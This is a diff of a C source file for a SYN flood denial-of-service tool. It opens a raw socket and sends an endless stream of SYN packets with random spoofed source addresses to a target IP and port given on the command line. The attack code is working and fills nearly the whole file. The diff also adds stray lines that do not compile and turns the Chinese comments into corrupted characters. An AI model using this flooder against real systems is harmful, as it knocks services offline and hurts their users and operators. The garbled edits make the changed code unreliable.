@@ -17,44 +17,46 @@ void dosAttack(int skFd,struct sockaddr_in* target,unsigned short srcPort);
 unsigned short check_sum(unsigned short * addr, int count);
 
 
-//1.ip,2.Ä¿µÄ¶Ë¿Ú,3.Ô´¶Ë¿Ú
+//1.ip,2.Ä¿ï¿½Ä¶Ë¿ï¿½,3.Ô´ï¿½Ë¿ï¿½
 int main(int argc,char** argv)
-{
+{
+
     int connFd;
     struct sockaddr_in target;
     struct hostent* host;
     const int on=1;
     unsigned short srcPort;
 
-    //´´½¨²¢ÉèÖÃµØÖ·¶ÔÏó
+    //ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ãµï¿½Ö·ï¿½ï¿½ï¿½ï¿½
     bzero(&target, sizeof(struct sockaddr_in));
-    //ÉèÖÃtarget¶ÔÏó
+    //ï¿½ï¿½ï¿½ï¿½targetï¿½ï¿½ï¿½ï¿½
     target.sin_family=AF_INET;
-    //host->net(str->int(µÚ¶þ¸ö²ÎÊý))
+    //host->net(str->int(ï¿½Ú¶ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½))
     target.sin_port=htons(atoi(argv[2]));//
     //
     if(inet_aton(argv[1],&target.sin_addr)==0)
     {
-        //»ñÈ¡±¾»úµØÖ·
+        //ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö·
         host=gethostbyname(argv[1]);
         if(host==NULL)
             perror("get host by name error!\n");
         target.sin_addr=*(struct in_addr*)(host->h_addr_list[0]);
     }
 
-    //´´½¨Ô­Ê¼Ì×½Ó×Ö
+    //ï¿½ï¿½ï¿½ï¿½Ô­Ê¼ï¿½×½ï¿½ï¿½ï¿½
     if(connFd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)==-1)
         perror("socket error\n");
 
-    //(Á¬½Ó¾ä±ú,Ö¸¶¨Îªip,¿É±à¼­Í·Ä£Ê½,´ò¿ª,´ò¿ª´óÐ¡)
+    //(ï¿½ï¿½ï¿½Ó¾ï¿½ï¿½,Ö¸ï¿½ï¿½Îªip,ï¿½É±à¼­Í·Ä£Ê½,ï¿½ï¿½,ï¿½ò¿ª´ï¿½Ð¡)
     if(setsockopt(connFd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on))==-1)
         perror("setsockopt error\n");
 
-    //»ñÈ¡¹ÜÀíÔ±È¨ÏÞ²ÅÄÜraw sock
-    setuid(getuid());//ÉèÖÃÎª¹ÜÀíÔ±
-    //»ñÈ¡Ô´¶Ë¿Ú×ª»¯Îªint
+    //ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½Ô±È¨ï¿½Þ²ï¿½ï¿½ï¿½raw sock
+    setuid(getuid());//ï¿½ï¿½ï¿½ï¿½Îªï¿½ï¿½ï¿½ï¿½Ô±
+    //ï¿½ï¿½È¡Ô´ï¿½Ë¿ï¿½×ªï¿½ï¿½Îªint
     srcPort=atoi(argv[3]);
-    //½øÐÐÐ­ÒéºÍÊý¾Ý°ü×é½¨
+    socket
+    //ï¿½ï¿½ï¿½ï¿½Ð­ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½ï¿½é½¨
     dosAttack(connFd,&target,srcPort);
     
 }
@@ -67,34 +69,35 @@ void dosAttack(int skFd,struct sockaddr_in* target,unsigned short srcPort)
     char buf[128]={};
     struct ip* ip=(struct ip*)buf;
     struct tcphdr* tcp;
-
-    //ÉèÖÃSYN°üµÄÊý¾Ý³¤¶È
+    struct ip ip;
+    ip.ar_request
+    //ï¿½ï¿½ï¿½ï¿½SYNï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý³ï¿½ï¿½ï¿½
     ipLen=sizeof(struct ip)+sizeof(struct tcphdr);
-    //Ìî³äipÍ·
-    ip->ip_hl=sizeof(struct ip)>>2;//³ýÒÔ4
+    //ï¿½ï¿½ï¿½ipÍ·
+    ip->ip_hl=sizeof(struct ip)>>2;//ï¿½ï¿½ï¿½ï¿½4
     ip->ip_v=IPVERSION; 
     ip->ip_tos=0;   /* type of service */
     ip->ip_len=htons(ipLen);
     ip->ip_id=0;
-    ip->ip_off=0;//Æ¬Æ«ÒÆoffset
+    ip->ip_off=0;//Æ¬Æ«ï¿½ï¿½offset
     ip->ip_ttl=MAXTTL;
-    ip->ip_p=IPPROTO_TCP;//Ð­Òé:ipÐ­ÒéÕ»µÄtcpÐ­Òé
+    ip->ip_p=IPPROTO_TCP;//Ð­ï¿½ï¿½:ipÐ­ï¿½ï¿½Õ»ï¿½ï¿½tcpÐ­ï¿½ï¿½
     ip->ip_sum=0;
     ip->ip_dst=target->sin_addr;
 
-    //Ìî³ätcp²¿·Ö
-    tcp=(struct tcphdr*)(buf+sizeof(struct ip));//Ç°°ë²¿·ÖipÄÚ´æ,ºó°ë²¿·Ötcp
-    tcp->source=htons(srcPort);//Ô´¶Ë¿Ú(int->net)Ö÷»úµ½ÍøÂç
-    tcp->dest=target->sin_port;//Ä¿±ê»ú¶Ë¿Ú
-    tcp->seq=random();//Ëæ»ú³õÊ¼»¯Ò»¸ötcpÐòºÅ
+    //ï¿½ï¿½ï¿½tcpï¿½ï¿½ï¿½ï¿½
+    tcp=(struct tcphdr*)(buf+sizeof(struct ip));//Ç°ï¿½ë²¿ï¿½ï¿½ipï¿½Ú´ï¿½,ï¿½ï¿½ë²¿ï¿½ï¿½tcp
+    tcp->source=htons(srcPort);//Ô´ï¿½Ë¿ï¿½(int->net)ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+    tcp->dest=target->sin_port;//Ä¿ï¿½ï¿½ï¿½ï¿½Ë¿ï¿½
+    tcp->seq=random();//ï¿½ï¿½ï¿½ï¿½ï¿½Ê¼ï¿½ï¿½Ò»ï¿½ï¿½tcpï¿½ï¿½ï¿½
     tcp->doff=5;
-    tcp->syn=1;//Í¬²½Î»1
+    tcp->syn=1;//Í¬ï¿½ï¿½Î»1
     tcp->check=0;
-
+    
     while(1)
     {
-        ip->ip_src.s_addr=random();//Ëæ»úÉú³ÉÔ´IP
-        //Éú³ÉtcpÐ£Ñéº¯Êý
+        ip->ip_src.s_addr=random();//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ô´IP
+        //ï¿½ï¿½ï¿½ï¿½tcpÐ£ï¿½éº¯ï¿½ï¿½
         tcp->check=check_sum((unsigned short*)tcp,sizeof(struct tcphdr));
         sendto(skFd,buf,ipLen,0,(struct sockaddr*)target,
             sizeof(struct sockaddr_in));
